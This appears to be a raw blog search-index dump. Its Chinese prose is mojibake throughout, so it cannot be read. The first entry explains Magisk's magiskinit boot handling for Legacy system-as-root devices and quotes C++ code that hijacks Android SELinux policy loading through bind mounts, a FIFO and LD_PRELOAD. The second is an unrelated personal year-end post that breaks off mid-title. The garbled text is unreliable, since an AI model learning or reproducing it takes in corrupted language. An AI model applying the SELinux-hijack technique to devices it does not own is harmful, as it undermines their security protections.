æ‰€æœ‰éœ€è¦ä¿®æ”¹çš„æ–‡ä»¶æ‰§è¡Œç³»ç»ŸåŸæ¥çš„ initï¼Œç»§ç»­å¼€æœºæµç¨‹init ä¼šè§£æå¹¶æ‰§è¡Œ init.rcï¼Œè¿è¡Œ magiskLegacy SARç»ˆäºè®²åˆ° Legacy SAR è¿™ä¸ªå‘äººçš„ç©æ„äº†ã€‚ã€‚ã€‚è¿™ç©æ„å‘äººçš„åœ°æ–¹åœ¨äºï¼šboot.img å†… ramdisk æ­£å¸¸æƒ…å†µä¸ä¼šç”¨åˆ°ï¼Œmagiskinit æ ¹æœ¬æ²¡æœºä¼šæ‰§è¡Œã€‚å¯¹äº A/B è®¾å¤‡ï¼Œboot é‡Œæ”¾ç€çš„æ˜¯ recovery ramdiskï¼Œbootloader é€šè¿‡å‘å†…æ ¸ä¼ é€’ skip_initramfs æ¥è®©å†…æ ¸çŸ¥é“è¯¥ä¸è¯¥æŒ‚è½½ initramfsã€‚Magisk çš„è§£å†³åŠæ³•æ˜¯ï¼Œå®‰è£…çš„æ—¶å€™ patch ä¸€ä¸‹å†…æ ¸ï¼ŒæŠŠ skip_initramfs patch æˆåˆ«çš„ä¸œè¥¿è¿™æ ·å†…æ ¸å°±è®¤ä¸å‡ºæ¥ bootloader ä¼ çš„æ˜¯ä»€ä¹ˆäº†ï¼Œç„¶åå°±ä¼šä¹–ä¹–çš„æŒ‚è½½ initramfsã€‚ä½†å¯¹äº A-only è®¾å¤‡ï¼Œboot.img é‡Œæ ¹æœ¬æ²¡æœ‰ ramdiskï¼Œå°±ç®—æ‰‹åŠ¨åŠ ä¸€ä¸ª ramdiskï¼Œbootloader ä¹Ÿå¾ˆæœ‰å¯èƒ½å¹¶ä¸è¯†åˆ«å®ƒï¼Œæ ¹æœ¬æ²¡åŠæ³•æ’ä¸€è„šã€‚Magisk è¡¨ç¤ºè‡£å¦¾æ— èƒ½ä¸ºåŠ›ï¼Œpatch recovery.img ç„¶åæ¯æ¬¡éƒ½é‡å¯åˆ° recovery ç”¨å§ï¼Œè¦ä¸ç„¶æˆ‘ä¹Ÿæ’ä¸è¿›å»å•Š~å³ä½¿æˆ‘ä»¬æˆåŠŸæŠŠ init å·æ¢æ¢æŸ±æˆäº† magiskinitï¼Œ/ ä¹Ÿæ˜¯ system.imgï¼Œå†™ä¸äº†ï¼Œå¾ˆéš¾å¹²æ´»ã€‚æ¥çœ‹çœ‹ magiskinit çš„ä»£ç å§ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/************* * Legacy SAR *************/class LegacySARInit : public MagiskInit &#123;private: bool mount_system_root(); void first_stage_prep();public: LegacySARInit(char *argv[], BootConfig *config) : MagiskInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125;; void start() override &#123; prepare_data(); bool is_two_stage = mount_system_root(); if (is_two_stage) first_stage_prep(); else patch_ro_root(); exec_init(); &#125;&#125;;bool LegacySARInit::mount_system_root() &#123; LOGD(\"Mounting system_root\\n\"); // there's no /dev in stub cpio xmkdir(\"/dev\", 0777); strcpy(blk_info.block_dev, \"/dev/root\"); do &#123; // Try legacy SAR dm-verity strcpy(blk_info.partname, \"vroot\"); auto dev = setup_block(); if (dev &gt; 0) goto mount_root; // Try NVIDIA naming scheme strcpy(blk_info.partname, \"APP\"); dev = setup_block(); if (dev &gt; 0) goto mount_root; sprintf(blk_info.partname, \"system%s\", config-&gt;slot); dev = setup_block(); if (dev &gt; 0) goto mount_root; // Poll forever if rootwait was given in cmdline &#125; while (config-&gt;rootwait); // We don't really know what to do at this point... LOGE(\"Cannot find root partition, abort\\n\"); exit(1);mount_root: xmkdir(\"/system_root\", 0755); if (xmount(\"/dev/root\", \"/system_root\", \"ext4\", MS_RDONLY, nullptr)) &#123; if (xmount(\"/dev/root\", \"/system_root\", \"erofs\", MS_RDONLY, nullptr)) &#123; // We don't really know what to do at this point... LOGE(\"Cannot mount root partition, abort\\n\"); exit(1); &#125; &#125; switch_root(\"/system_root\"); // Make dev writable xmount(\"tmpfs\", \"/dev\", \"tmpfs\", 0, \"mode=755\"); mount_list.emplace_back(\"/dev\"); // Use the apex folder to determine whether 2SI (Android 10+) bool is_two_stage = access(\"/apex\", F_OK) == 0; LOGD(\"is_two_stage: [%d]\\n\", is_two_stage); // For API 28 AVD, it uses legacy SAR setup that requires // special hacks in magiskinit to work properly. if (!is_two_stage &amp;&amp; config-&gt;emulator) &#123; // AVDï¼Œä¸é‡è¦ &#125; return is_two_stage;&#125;void LegacySARInit::first_stage_prep() &#123; // Patch init binary int src = xopen(\"/init\", O_RDONLY); int dest = xopen(\"/data/init\", O_CREAT | O_WRONLY, 0); &#123; mmap_data init(\"/init\"); for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) &#123; LOGD(\"Patch @ %08zX [\" INIT_PATH \"] -&gt; [\" REDIR_PATH \"]\\n\", off); &#125; write(dest, init.buf(), init.sz()); fclone_attr(src, dest); close(dest); close(src); &#125; xmount(\"/data/init\", \"/init\", nullptr, MS_BIND, nullptr);&#125;æ€»ç»“å¦‚ä¸‹ï¼šmagiskinit è¢«è¿è¡Œï¼Œæ£€æµ‹ç³»ç»Ÿç¯å¢ƒï¼Œåˆ¤æ–­ä¸º Legacy SARï¼Œè¿›å…¥ LegacySARInitå› ä¸º kernel è¢«æˆ‘ä»¬ patch äº†ï¼ŒåŸæœ¬ switch root åº”è¯¥ç”± kernel æ¥åšçš„ï¼Œç°åœ¨æ²¡æœ‰äº†ï¼Œéœ€è¦æ‰‹åŠ¨ mount /system ç„¶å switch root è¿›å»æ£€æµ‹æœ‰æ²¡æœ‰ /apexï¼Œæœ‰çš„è¯ä»£è¡¨ Android 10+ï¼Œinit æœ‰ selinux_setup é˜¶æ®µï¼Œå¯ä»¥åŠ«æŒï¼Œèµ° first_stage_prep()ï¼›æ²¡æœ‰çš„è¯ç›´æ¥ patch_ro_boot() ç„¶åæ‰§è¡ŒåŸæ¥çš„ initfirst_stage_prep() é‡Œä¼šåƒ Modern 2SI é‚£æ ·ä¿®è¡¥ initï¼Œå°† /system/bin/init é‡å®šå‘åˆ° /data/magiskinitï¼Œç„¶åæŠŠå®ƒæŒ‚è½½åˆ° /init ä»¥ä¾›åé¢æ‰§è¡Œï¼›æ‰§è¡ŒåŸæ¥çš„ initã€‚åŸæ¥çš„ init æ‰§è¡Œ selinux_setupï¼ˆè‹¥æœ‰ï¼‰ï¼Œè½¬åˆ° magiskinitï¼Œmagiskinit è¯†åˆ«åˆ°äºŒé˜¶æ®µï¼Œè‡ªåŠ¨ patch_ro_boot()patch_ro_boot() å®Œæˆä¹‹åï¼Œæ‰§è¡Œ init äº¤è¿˜æ§åˆ¶æƒï¼Œç»§ç»­å¼€æœºä¿®è¡¥ SEPolicyç”±äºè¿™ä¸€å—è¿‡äºå¤æ‚ï¼Œæ‰€ä»¥å•ç‹¬æ”¾ä¸€èŠ‚è®²ã€‚å¦‚æœä½ ä»”ç»†çœ‹äº†ä¸Šé¢çš„ä»£ç ï¼Œä½ ä¼šå‘ç°ä¿®è¡¥ SEPolicy æœ‰ patch_sepolicy() ä»¥åŠ hijack_sepolicy() ä¸¤ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä»¬æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128void MagiskInit::patch_sepolicy(const char *in, const char *out) &#123; LOGD(\"Patching monolithic policy\\n\"); auto sepol = unique_ptr&lt;sepolicy&gt;(sepolicy::from_file(in)); /** ä¿®è¡¥ sepolicy **/ sepol-&gt;magisk_rules(); LOGD(\"Dumping sepolicy to: [%s]\\n\", out); sepol-&gt;to_file(out); // Remove OnePlus stupid debug sepolicy and use our own if (access(\"/sepolicy_debug\", F_OK) == 0) &#123; unlink(\"/sepolicy_debug\"); link(\"/sepolicy\", \"/sepolicy_debug\"); &#125;&#125;#define MOCK_COMPAT SELINUXMOCK \"/compatible\"#define MOCK_LOAD SELINUXMOCK \"/load\"#define MOCK_ENFORCE SELINUXMOCK \"/enforce\"bool MagiskInit::hijack_sepolicy() &#123; xmkdir(SELINUXMOCK, 0); if (access(\"/system/bin/init\", F_OK) == 0) &#123; // On 2SI devices, the 2nd stage init file is always a dynamic executable. // This meant that instead of going through convoluted methods trying to alter // and block init's control flow, we can just LD_PRELOAD and replace the // security_load_policy function with our own implementation. dump_preload(); setenv(\"LD_PRELOAD\", \"/dev/preload.so\", 1); &#125; // Hijack the \"load\" and \"enforce\" node in selinuxfs to manipulate // the actual sepolicy being loaded into the kernel auto hijack = [&amp;] &#123; LOGD(\"Hijack [\" SELINUX_LOAD \"]\\n\"); close(xopen(MOCK_LOAD, O_CREAT | O_RDONLY, 0600)); xmount(MOCK_LOAD, SELINUX_LOAD, nullptr, MS_BIND, nullptr); LOGD(\"Hijack [\" SELINUX_ENFORCE \"]\\n\"); mkfifo(MOCK_ENFORCE, 0644); xmount(MOCK_ENFORCE, SELINUX_ENFORCE, nullptr, MS_BIND, nullptr); &#125;; string dt_compat; if (access(SELINUX_ENFORCE, F_OK) != 0) &#123; // selinuxfs not mounted yet. Hijack the dt fstab nodes first // and let the original init mount selinuxfs for us. // This only happens on Android 8.0 - 9.0 char buf[4096]; ssprintf(buf, sizeof(buf), \"%s/fstab/compatible\", config-&gt;dt_dir); dt_compat = full_read(buf); if (dt_compat.empty()) &#123; // Device does not do early mount and uses monolithic policy return false; &#125; // Remount procfs with proper options xmount(nullptr, \"/proc\", nullptr, MS_REMOUNT, \"hidepid=2,gid=3009\"); LOGD(\"Hijack [%s]\\n\", buf); // Preserve sysfs and procfs for hijacking mount_list.erase(std::remove_if( mount_list.begin(), mount_list.end(), [](const string &amp;s) &#123; return s == \"/proc\" || s == \"/sys\"; &#125;), mount_list.end()); mkfifo(MOCK_COMPAT, 0444); xmount(MOCK_COMPAT, buf, nullptr, MS_BIND, nullptr); &#125; else &#123; hijack(); &#125; // Create a new process waiting for init operations if (xfork()) &#123; // In parent, return and continue boot process return true; &#125; if (!dt_compat.empty()) &#123; // This open will block until init calls DoFirstStageMount // The only purpose here is actually to wait for init to mount selinuxfs for us int fd = xopen(MOCK_COMPAT, O_WRONLY); char buf[4096]; ssprintf(buf, sizeof(buf), \"%s/fstab/compatible\", config-&gt;dt_dir); xumount2(buf, MNT_DETACH); hijack(); xwrite(fd, dt_compat.data(), dt_compat.size()); close(fd); &#125; // This open will block until init calls security_getenforce int fd = xopen(MOCK_ENFORCE, O_WRONLY); // Cleanup the hijacks umount2(\"/init\", MNT_DETACH); xumount2(SELINUX_LOAD, MNT_DETACH); xumount2(SELINUX_ENFORCE, MNT_DETACH); // Load and patch policy auto sepol = unique_ptr&lt;sepolicy&gt;(sepolicy::from_file(MOCK_LOAD)); sepol-&gt;magisk_rules(); sepol-&gt;load_rules(rules); // Load patched policy into kernel sepol-&gt;to_file(SELINUX_LOAD); // Write to the enforce node ONLY after sepolicy is loaded. We need to make sure // the actual init process is blocked until sepolicy is loaded, or else // restorecon will fail and re-exec won't change context, causing boot failure. // We (ab)use the fact that init reads the enforce node, and because // it has been replaced with our FIFO file, init will block until we // write something into the pipe, effectively hijacking its control flow. string enforce = full_read(SELINUX_ENFORCE); xwrite(fd, enforce.data(), enforce.length()); close(fd); // At this point, the init process will be unblocked // and continue on with restorecon + re-exec. // Terminate process exit(0);&#125;æœ€ç›´è§‚çš„æ„Ÿè§‰å°±æ˜¯ï¼Œä¸¤ä¸ªå‡½æ•°ä»£ç é‡ä¸ä¸€æ ·â€¦â€¦Android ä¸Šï¼Œsepolicy å¯ä»¥ä»¥å•ä¸ªçš„ sepolicy æ–‡ä»¶çš„å½¢å¼å­˜å‚¨ï¼Œä¹Ÿå¯ä»¥å­˜å‚¨å¤šä¸ªæ‹†åˆ†çš„ cil æ–‡ä»¶ï¼›å‰è€…è¢«ç§°ä¸º monolithic policyï¼Œåè€…è¢«ç§°ä¸º split sepolicyã€‚Linux å†…æ ¸åªæ¥å— monolithic policyï¼Œæ‰€ä»¥åŠ è½½ split sepolicy æ—¶ï¼Œç”± init è¿›ç¨‹è´Ÿè´£å°† cil æ–‡ä»¶ç¼–è¯‘ä¸º monolithic policy å¹¶åŠ è½½è¿›å†…æ ¸ã€‚å¯¹äº monolithic policyï¼Œmagiskinit patch èµ·æ¥éå¸¸è½»æ¾æƒ¬æ„ï¼šç›´æ¥åŠ è½½ /sepolicyï¼Œä¿®æ”¹ï¼Œæ”¾å›å»ï¼Œç„¶å init åŠ è½½çš„æ—¶å€™å°±ä¼šåŠ è½½æˆ‘ä»¬ä¿®æ”¹è¿‡çš„ sepolicyã€‚è€Œå¯¹äº split policy å¯å°±éº»çƒ¦äº†ï¼Œinit è¿è¡Œä¹‹å‰å¯èƒ½æ ¹æœ¬æ²¡æœ‰ /sepolicy ç»™ä½  patchï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿå› ä¸º init ä¼šæŠŠ cil å…¨éƒ¨ç¼–è¯‘æˆ monolithic policy ç„¶åå†ä¼ è¿›å†…æ ¸é‡Œï¼ˆå…·ä½“æ˜¯å¾€ /sys/fs/selinux/load å†™å…¥ï¼‰ï¼Œè¦æ˜¯æœ‰æ–¹æ³•æ‹¦æˆªè¿™ä¸ªå†™å…¥è¿‡ç¨‹å°±å¥½äº†ï¼æœ‰å—ï¼Ÿè¿˜çœŸæœ‰ã€‚å…ˆå¿«é€Ÿä»‹ç»ä¸€ä¸‹ FIFO çš„æ¦‚å¿µï¼šFIFO çœ‹èµ·æ¥å°±åƒä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶ï¼Œä½†æ˜¯å®ƒç”¨èµ·æ¥ç±»ä¼¼ pipeï¼Œå°±æ˜¯ä¸€æ ¹ç®¡å­ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹å¾€é‡Œå†™å†…å®¹çš„æ—¶å€™ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹èƒ½è¯»å–åˆ°ã€‚åè¿‡æ¥ï¼Œä¸€ä¸ªè¿›ç¨‹è¯»å®ƒçš„æ—¶å€™ï¼Œé»˜è®¤ä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰å¦å¤–çš„è¿›ç¨‹æ‰“å¼€äº†è¿™ä¸ª FIFO å¹¶ä¸”å†™å…¥å†…å®¹ã€‚è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è¿›ç¨‹é—´é€šä¿¡çš„ç®¡å­ï¼Œåªä¸è¿‡é•¿å¾—æ˜¯ä¸ªæ–‡ä»¶è€Œå·²ã€‚Magisk çš„ hijack_policy() æ­£æ˜¯åˆ©ç”¨äº† FIFO çš„ç‰¹æ€§ï¼Œæ‰èƒ½æ‹¦æˆªåˆ° init åŠ è½½ sepolicy çš„è¿‡ç¨‹ã€‚å…·ä½“æ¥è¯´ï¼Œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼šåˆ¤æ–­ selinuxfs æœ‰æ²¡æœ‰è¢«æŒ‚è½½ï¼Œå¦‚æœæ²¡æœ‰éœ€è¦å…ˆç­‰ init æŒ‚è½½ selinuxfsã€‚è¿™é‡Œæˆ‘ä»¬åŒæ ·åˆ©ç”¨ FIFOï¼Œé€‰æ‹©äº†ä¸€ä¸ª init æŒ‚è½½å®Œ selinuxfs ä¹‹åä¼šè¯»å–çš„æ–‡ä»¶ï¼Œæ¥å¡ä½æ—¶æœºã€‚é‡Œé¢çš„æ³¨é‡Š This only happens on Android 8.0 - 9.0 å…¶å®æ˜¯å› ä¸ºæ›´æ—§çš„ç‰ˆæœ¬æ²¡æœ‰ split policyï¼Œç›´æ¥ patch monolithic policy å°±å¥½äº†ï¼Œä¸ç”¨èµ° hijackï¼›è€Œ Android 10+ init å§‹ç»ˆåˆ†ä¸ºä¸‰æ­¥ï¼Œæˆ‘ä»¬æ°¸è¿œåœ¨ selinux_setup æ—¶è¿›è¡Œ hijackï¼Œæ­¤æ—¶ first stage å·²ç»èµ°å®Œäº†ï¼Œselinuxfs è‚¯å®šå·²ç»è¢« init mount ä¸Šäº†ï¼›åªæœ‰ Android 8.0-9.0ï¼Œæœ‰å¯èƒ½æœ‰ split policy åˆæ²¡æœ‰å•ç‹¬çš„ selinux_setup è¿™ä¸€æ­¥å¯ä»¥æ‹¦æˆªï¼Œæ‰€ä»¥åªèƒ½æ‰‹åŠ¨è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ç”¨ bind mount æŠŠ /sys/fs/selinux/load è¦†ç›–æˆä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶ï¼Œè¿™æ · init å¾€é‡Œå†™å…¥ sepolicy æ—¶å…¶å®æ˜¯å†™è¿›äº†æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å†…æ ¸é‡Œè°ƒç”¨ mkfifo() åˆ›å»ºä¸€ä¸ª FIFOï¼Œç„¶å bind mount åˆ° /sys/fs/selinux/enforce ä¸Šé¢fork ä¸€ä¸ªå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­æ‰§è¡Œå‰©ä½™æ­¥éª¤ï¼Œç„¶åæ‰§è¡ŒåŸå§‹ initï¼›å­è¿›ç¨‹ä¼šä»¥ write-only çš„æ–¹å¼æ‰“å¼€è¿™ä¸ª FIFOï¼Œæ­¤æ—¶å› ä¸º FIFO çš„ç‰¹æ€§ï¼Œè¿™ä¸ªè¿›ç¨‹ä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰å¦ä¸€ä¸ªè¿›ç¨‹ä»¥ read æ–¹å¼æ‰“å¼€åŒæ ·çš„ FIFOã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­å½“ä¸­ï¼Œå­è¿›ç¨‹ä¼šé˜»å¡ï¼Œç›´åˆ° init è°ƒç”¨ security_getenforce() è¯»å–äº† /sys/fs/selinux/enforceï¼Œæ­¤æ—¶ init é˜»å¡ï¼Œç­‰å¾…æˆ‘ä»¬çš„å­è¿›ç¨‹å¾€ FIFO å†…å†™å…¥å†…å®¹ï¼Œè€Œæ­¤æ—¶ init å·²ç»æŠŠè¦åŠ è½½çš„ sepolicy å†™å…¥åˆ°äº† /sys/fs/selinux/loadè¯»å– init åŸæœ¬è¦åŠ è½½çš„ sepolicyï¼Œè¿›è¡Œ patch æ³¨å…¥è‡ªå·±çš„è§„åˆ™ï¼Œç„¶åæ‰‹åŠ¨åŠ è½½è¿›å†…æ ¸é‡Œï¼ˆå› ä¸ºä¹‹å‰ init å°è¯•åŠ è½½çš„æ—¶å€™è¢«æˆ‘ä»¬ç»™æ‹¦äº†ï¼‰å¾€ FIFO å†™å…¥å†…å®¹ï¼Œå”¤é†’å¯¹ç«¯çš„ init è¿›ç¨‹ï¼Œåšä¸€äº› cleanup ç„¶åå¯ä»¥é€€å‡ºå­è¿›ç¨‹ã€‚è™½ç„¶æ•´ä¸ª hijack è¿˜ä½¿ç”¨äº† LD_PRELOAD ç­‰æŠ€æœ¯æ¥ä¿è¯ sepolicy hijack èƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œä½†å¤§è‡´æµç¨‹å°±æ˜¯å¦‚ä¸Šæ‰€ç¤ºã€‚æ•´ä¸ªæœºåˆ¶éå¸¸ç²¾å¦™ï¼Œéå¸¸ä¾èµ– init çš„å®é™…è¡Œä¸ºï¼Œéœ€è¦ç»“åˆ android init åŠ libselinux çš„æºç åå¤ç¢ç£¨æ‰èƒ½ææ¸…å…¶ä¸­é€»è¾‘ã€‚","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"}]},{"title":"è‹¥äººç”Ÿæ˜¯åœºå¤§æ¢¦å•Šâ€”â€”è®°æˆ‘äººç”Ÿçš„å‰19å¹´","slug":"first-19-years-of-my-life","date":"2023-11-06T11:16:26.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2023/11/06/first-19-years-of-my-life/","link":"","permalink":"https://blog.canyie.top/2023/11/06/first-19-years-of-my-life/","excerpt":"ä¸Šæ¬¡å‘å¹´ç»ˆæ€»ç»“è¿˜æ˜¯ 2022 å¹´å‘ 2021 å¹´çš„ï¼Œ2022 å¹´çš„å¹´ç»ˆæ€»ç»“ç¼ºå¤±äº†ã€‚ä»Šå¹´å‘ç”Ÿäº†å¥½å¤šå¥½å¤šçš„äº‹æƒ…ï¼Œä¸€ç›´æƒ³å†™ä»Šå¹´çš„å¹´ç»ˆæ€»ç»“ä½†æ˜¯å´æ€»æ²¡åˆ°å¹´ç»ˆï¼Œå¹²è„†å†™æˆå‰ 19 å¹´çºªå¿µå§ã€‚","text":"ä¸Šæ¬¡å‘å¹´ç»ˆæ€»ç»“è¿˜æ˜¯ 2022 å¹´å‘ 2021 å¹´çš„ï¼Œ2022 å¹´çš„å¹´ç»ˆæ€»ç»“ç¼ºå¤±äº†ã€‚ä»Šå¹´å‘ç”Ÿäº†å¥½å¤šå¥½å¤šçš„äº‹æƒ…ï¼Œä¸€ç›´æƒ³å†™ä»Šå¹´çš„å¹´ç»ˆæ€»ç»“ä½†æ˜¯å´æ€»æ²¡åˆ°å¹´ç»ˆï¼Œå¹²è„†å†™æˆå‰ 19 å¹´çºªå¿µå§ã€‚ä»ä¸­èŒï¼Œåˆ°å¤§å­¦2021 å¹´å¹´åº•ï¼Œä»ç”µå­å‚å›æ¥äº†ï¼Œç®€å•è¿‡äº†ä¸€ä¸ªå¹´ä¹‹åï¼Œ2022 å¹´åˆï¼Œæˆ‘çš„ä¸­èŒå­¦æ ¡ç»ˆäºå¼€è®¾äº†é«˜è€ƒç­ï¼Œä½†ä»¤æˆ‘æ²¡æƒ³åˆ°çš„æ˜¯ï¼Œå­¦æ ¡è¦æ±‚é«˜è€ƒç­å­¦ç”Ÿå…ˆè¿›ç”µå­å‚å†å®ä¹ ä¸‰ä¸ªæœˆï¼Œä¹æœˆä»½å†æ­£å¼å¼€å§‹å­¦ã€‚ä¸ºäº†é€ƒé¿å®ä¹ ï¼Œåªèƒ½å’Œå­¦æ ¡è¯´è¦å‚åŠ ç«èµ›ï¼Œç„¶åè·‘å» CSP-J 2022 ç©äº†ä¸€åœˆã€‚ä¹æœˆä»½åï¼Œè¿›å…¥é«˜ä¸‰ï¼ˆæˆ‘ä¸ç®¡æˆ‘ä¸ç®¡ä¸­èŒä¸‰å¹´çº§ä¹Ÿèƒ½å«åšé«˜ä¸‰ï¼‰ï¼Œå®ä¹ çš„åŒå­¦éƒ½å›æ¥äº†ï¼Œè¯¾ç¨‹å†æ¬¡ä»é›¶å¼€å§‹é‡ç½®ï¼ŒæŒ‘æˆ˜äº†ä¸€å‡ºä¸‰ä¸ªæœˆå­¦å®Œå…¨éƒ¨å†…å®¹ã€‚2022 å¹´åº•ï¼ŒCOVID-19 ç–«æƒ…é˜²æ§æ”¿ç­–æ”¾å¼€ï¼ŒCOVID-19 Omicron å¤§çˆ†å‘ï¼Œä¸´è¿‘è€ƒè¯•çš„æ—¶åˆ»è¢«å­¦æ ¡å…¨éƒ¨é£é€å›å®¶ï¼Œç„¶åä½“éªŒäº†æ–°å† ä¸€å‘¨é€Ÿé€šï¼ˆä¸å¾—ä¸è¯´æ˜¯çœŸä»–å¦ˆéš¾å—å•Šï¼‰ã€‚å¹¸å¥½ï¼Œé«˜èŒé«˜è€ƒå®£å¸ƒå»¶æœŸï¼ˆä¸å»¶æœŸæˆ‘å°±è¦å½“åœºæ­»æ‰äº†ï¼ï¼ï¼ï¼‰ï¼Œåœ¨å®¶ç©äº†æœ€é•¿çš„ä¸€ä¸ªå¯’å‡ï¼ˆé™¤äº†2020å¹´å¯’å‡ï¼‰ï¼Œ2æœˆä»½å°±è¿™æ ·ä¸Šäº†è€ƒåœºã€‚ç»“æœæ˜¯ï¼Œ367åˆ†ï¼Œä¸€å¼€å§‹çœ‹è§åˆ†æ•°æœ‰ç‚¹å¤±æœ›ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»Šå¹´è¯•é¢˜æ¯”å¾€å¹´åéš¾è¿˜æ˜¯å…¶ä»–è€ƒç”Ÿç»è¿‡æ–°å† åéƒ½æ²¡å‘æŒ¥å¥½ï¼Œç«Ÿç„¶è€ƒåˆ°äº†å…¨çœå››ç™¾å¤šåï¼Œå®Œå…¨æƒ³ä¸åˆ°çš„ç»“æœã€‚ç„¶åå°±æ˜¯å¡«å¿—æ„¿é€‰å­¦æ ¡äº†ï¼Œé¢å¯¹åªæœ‰ä¸¤é—´è¿˜éƒ½æ˜¯æ°‘åŠçš„æœ¬ç§‘é™¢æ ¡å’Œå…¨çœç”šè‡³å…¨å›½æœ€å¥½çš„ä¸“ç§‘é™¢æ ¡ï¼Œè¿˜æ˜¯é€‰æ‹©äº†å¡«æŠ¥æœ¬ç§‘ã€‚åˆ°äº†ä¸“ä¸šæŠ€èƒ½æµ‹è¯•ï¼Œç»“æœç«Ÿç„¶è€ƒäº†50é“é€‰æ‹©é¢˜ï¼Œè½»æ¾æ‹¿ä¸‹ã€‚æ€»ä¹‹æ€ä¹ˆè¯´å‘¢ï¼Œç»ˆäºæ‘†è„±äº†ä¸­ç­‰èŒä¸šæ•™è‚²ï¼Œç»ˆäºå’Œä»¥å‰çš„åŒå­¦ä»¬åˆç«™åœ¨äº†åŒä¸€æ¡èµ·è·‘çº¿ã€‚ä¸Šå­¦å¥½ç´¯ï¼ŒçœŸçš„å¥½ç´¯ï¼Œç»§ç»­åŠªåŠ›å§ã€‚æˆ‘æƒ³ï¼Œåšæˆ‘å–œæ¬¢çš„äº‹æƒ…æˆ‘å–œæ¬¢è®¡ç®—æœºï¼Œæˆ‘å–œæ¬¢ç¼–ç¨‹ï¼Œæˆ‘å–œæ¬¢ç ”ç©¶å¥‡æ€ªçš„äº‹æƒ…ï¼Œæˆ‘å–œæ¬¢å¸®åŠ©åˆ«äººã€‚æˆ‘ä¸€ç›´éƒ½çŸ¥é“ã€‚è¿™ä¸¤å¹´ç»™ Magisk æäº¤äº†å¥½å¤šå¥½å¤šä»£ç ï¼Œå°±åœ¨ 2022 å¹´çš„æœ€åä¸€å¤©æ™šä¸Šï¼Œæˆ‘è¿˜åœ¨ç»™ magisk ä¿® bugã€‚commit, push, create pull request, reply to the initial issueï¼Œæ—¶é’Ÿå°±è¿™æ ·è½¬åˆ°äº† 23:59 ï¼ˆä»¥ UTC+8 æ—¶é—´ï¼‰ã€‚å’Œå¦ä¸€ä½ç»´æŠ¤è€…è¯´äº†å¥æ–°å¹´å¿«ä¹ï¼Œå°±è¿™æ ·ï¼Œ2022 å¹´ç»“æŸäº†ï¼Œæ–°çš„ 2023 å¹´æ¥äº†ã€‚2023 å¹´ä¸€æœˆï¼Œæ–°çš„ä¸€å¹´çš„ç¬¬ä¸€ä¸ªæœˆï¼Œæ‹¿åˆ°äº† Magisk é¡¹ç›®çš„ collaborator èº«ä»½ï¼Œåç»­åˆæŠŠ canyie è¿™ä¸ªåå­—æ”¾è¿›äº† magisk app ä¸»é¡µã€å…³æ³¨æˆ‘ä»¬ã€‘é‡Œçš„å¼€å‘è€…åˆ—è¡¨ï¼Œç®—æ˜¯å®‰æ…°ä¸€ä¸‹è‡ªå·±å§ã€‚é«˜èŒé«˜è€ƒç»“æŸä¹‹åï¼Œé€‰æ‹©ç¡¬åˆšå­¦æ ¡ï¼Œè‡ªè¡Œè·‘è·¯åè”ç³»äº†ä»¥å‰è®¤è¯†çš„ä¸€ä¸ªé•¿æ²™è€æ¿ï¼ŒæˆåŠŸåŠ å…¥åˆ°äº†ä»–ä»¬å…¬å¸å¹²äº†å››ä¸ªæœˆæ´»ï¼Œæ˜¯å°æ—¶å€™æ¢¦å¯ä»¥æ±‚çš„ Android Framework å¼€å‘å·¥ç¨‹å¸ˆå“¦ã€‚å·¥ä½œçš„æ—¶å€™ï¼Œç ”ç©¶ Android Framework çš„æ—¶å€™è¿˜æ„å¤–å‘ç°äº†ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œå’Œ google åé¦ˆä¹‹åï¼Œgoogle å®šçº§ä¸ºä¸­å±æ¼æ´ï¼Œæœ¬æ¥ä»¥ä¸ºèƒ½é¢†åˆ°äººç”Ÿä¸­ç¬¬ä¸€ä¸ª CVE çš„ï¼Œç»“æœäº”æœˆä»½ google æ”¹æ”¿ç­–ï¼Œä¸ç»™æ™®é€šçš„ moderate issue åˆ†é… CVE äº†ï¼Œåˆ°æ‰‹çš„ CVE é£äº†ï¼Œå¤ªåäº†ã€‚ç»§ç»­åŠªåŠ›å§ã€‚å°±è¿™æ ·å§ã€‚æœŸå¾…ä¸‹æ¬¡ç›¸è§ã€‚","categories":[],"tags":[{"name":"å¹´é‰´","slug":"å¹´é‰´","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"é—²èŠ","slug":"é—²èŠ","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"å†™ç»™ Android 